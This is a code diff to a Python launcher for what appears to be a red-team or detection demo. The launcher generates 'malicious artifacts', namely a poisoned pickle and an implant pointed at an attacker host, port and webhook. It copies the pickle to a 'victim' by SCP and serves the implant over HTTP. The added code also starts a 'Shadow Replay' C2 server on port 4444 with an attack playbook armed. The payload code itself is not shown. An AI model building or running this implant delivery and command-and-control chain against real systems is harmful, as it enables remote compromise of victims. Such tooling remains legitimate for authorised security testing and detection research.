@@ -20,6 +20,7 @@ Usage:
 import argparse
 import http.server
 import os
+import shutil
 import signal
 import socketserver
 import subprocess
@@ -59,10 +60,18 @@ def generate_artifacts(cfg: dict, out_dir: str) -> str:
 
     github_token = cfg.get("c2", {}).get("github_token", "")
     webhook_url = cfg.get("c2", {}).get("webhook_url", "")
-    implant_src = generate_implant(attacker_host, "__GIST_ID__", webhook_url)
+    implant_src = generate_implant(attacker_host, attacker_port, "__GIST_ID__", webhook_url)
     implant_path = serve_dir / "implant.py"
     with open(implant_path, "w") as f:
         f.write(implant_src)
+
+    # Copy SR Linux agent so implant can fetch it
+    sr_agent_src = Path("/Users/lgil02/Desktop/Falcon Forge/shadow-replay/agent_linux.py")
+    if sr_agent_src.exists():
+        shutil.copy(sr_agent_src, serve_dir / "agent_linux.py")
+        print(f"  sr agent → {serve_dir}/agent_linux.py")
+    else:
+        print(f"  [!] SR agent not found at {sr_agent_src}")
 
     print(f"  pickle  → {pkl_path}")
     print(f"  implant → {implant_path}")
@@ -110,6 +119,35 @@ def start_http_server(serve_dir: str, port: int = 8080) -> socketserver.TCPServe
     return server
 
 
+def start_shadow_replay() -> subprocess.Popen:
+    """Start Shadow Replay C2 server on :4444 with hugreplay_linux playbook armed."""
+    sr_dir = Path("/Users/lgil02/Desktop/Falcon Forge/shadow-replay")
+
+    # Sync playbook from HugReplay into SR's playbooks dir
+    playbook_src = Path(__file__).parent / "playbooks" / "hugreplay_linux.json"
+    playbook_dst = sr_dir / "playbooks" / "hugreplay_linux.json"
+    if playbook_src.exists():
+        shutil.copy(playbook_src, playbook_dst)
+    else:
+        print(f"  [!] Playbook not found at {playbook_src}")
+
+    env = os.environ.copy()
+    env["AUTO_START"] = "true"
+    env["AUTO_START_PLAYBOOK"] = "hugreplay_linux"
+    env["AUTO_LOOP"] = "false"
+
+    proc = subprocess.Popen(
+        [sys.executable, "app.py"],
+        cwd=str(sr_dir),
+        env=env,
+        stdout=sys.stdout,
+        stderr=sys.stderr,
+    )
+    time.sleep(2)
+    print(f"  shadow replay on :4444  →  {sr_dir}")
+    return proc
+
+
 def start_dashboard(config_path: str) -> subprocess.Popen:
     """Start Flask dashboard as a subprocess."""
     proc = subprocess.Popen(
@@ -144,26 +182,30 @@ def main():
     dashboard_port = cfg.get("dashboard", {}).get("port", 5001)
 
     # --- Step 1: Generate artifacts ---
-    print("[1/4] Generating malicious artifacts...")
+    print("[1/5] Generating malicious artifacts...")
     pkl_path = generate_artifacts(cfg, out_dir)
 
     # --- Step 2: Upload pickle to victim ---
     if not args.no_scp:
-        print("[2/4] Uploading pickle to victim...")
+        print("[2/5] Uploading pickle to victim...")
         try:
             scp_to_victim(cfg, pkl_path)
         except Exception as e:
             print(f"  [!] SCP failed: {e}")
             print("      Copy manually: scp /tmp/hugreplay/imagenet_labels.pkl ubuntu@<victim>:/tmp/")
     else:
-        print("[2/4] Skipping SCP (--no-scp)")
+        print("[2/5] Skipping SCP (--no-scp)")
 
     # --- Step 3: Start implant HTTP server ---
-    print("[3/4] Starting implant HTTP server...")
+    print("[3/5] Starting implant HTTP server...")
     start_http_server(serve_dir)
 
-    # --- Step 4: Start dashboard ---
-    print("[4/4] Starting dashboard...")
+    # --- Step 4: Start Shadow Replay ---
+    print("[4/5] Starting Shadow Replay (EDR telemetry)...")
+    sr_proc = start_shadow_replay()
+
+    # --- Step 5: Start dashboard ---
+    print("[5/5] Starting dashboard...")
     dashboard_proc = start_dashboard(args.config)
 
     dashboard_url = f"http://{attacker_ip}:{dashboard_port}"
@@ -182,6 +224,7 @@ def main():
     def _handle_signal(sig, frame):
         print("\n[Demo] Stopping...")
         dashboard_proc.terminate()
+        sr_proc.terminate()
         sys.exit(0)
 
     signal.signal(signal.SIGINT, _handle_signal)
